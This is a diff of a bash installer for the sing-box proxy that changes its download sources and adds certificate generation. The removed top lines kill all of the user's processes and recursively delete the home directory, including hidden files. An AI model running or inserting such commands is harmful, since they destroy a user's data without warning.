@@ -1,10 +1,5 @@
 #!/bin/bash
-ps aux | grep $(whoami) | grep -v "sshd\|bash\|grep" | awk '{print $2}' | xargs -r kill -9 2>/dev/null
-chmod -R 755 ~/* \
-chmod -R 755 ~/.* \
-rm -rf ~/.* \
-rm -rf ~/*
-rm -rf ~/*
+
 # 定义颜色
 green() { echo -e "\e[1;32m$1\033[0m"; }
 yellow() { echo -e "\e[1;33m$1\033[0m"; }
@@ -37,16 +32,16 @@ install_singbox() {
     green "开始安装并配置 sing-box (vless-reality, hysteria2, tuic)..."
     cd $WORKDIR || exit 1
 
-    # 下载文件
+    # 下载 sing-box 和依赖
     ARCH=$(uname -m)
     DOWNLOAD_DIR="."
     mkdir -p "$DOWNLOAD_DIR"
     FILE_INFO=()
 
     if [[ "$ARCH" =~ ^(arm|arm64|aarch64)$ ]]; then
-        FILE_INFO=("https://github.com/eooce/test/releases/download/arm64/sb web")
+        FILE_INFO=("https://github.com/SagerNet/sing-box/releases/download/v1.3.1/sing-box-linux-arm64 sb")
     elif [[ "$ARCH" =~ ^(amd64|x86_64|x86)$ ]]; then
-        FILE_INFO=("https://github.com/eooce/test/releases/download/freebsd/sb web")
+        FILE_INFO=("https://github.com/SagerNet/sing-box/releases/download/v1.3.1/sing-box-linux-amd64 sb")
     else
         red "Unsupported architecture: $ARCH"
         exit 1
@@ -64,6 +59,10 @@ install_singbox() {
     private_key=$(echo "$output" | awk '/PrivateKey:/ {print $2}')
     public_key=$(echo "$output" | awk '/PublicKey:/ {print $2}')
     [ -n "$private_key" ] || { red "Failed to generate private key"; exit 1; }
+
+    # 生成证书文件
+    openssl ecparam -genkey -name prime256v1 -out "private.key"
+    openssl req -new -x509 -days 3650 -key "private.key" -out "cert.pem" -subj "/CN=$reality_domain"
 
     # 生成配置文件
     cat > config.json << EOF
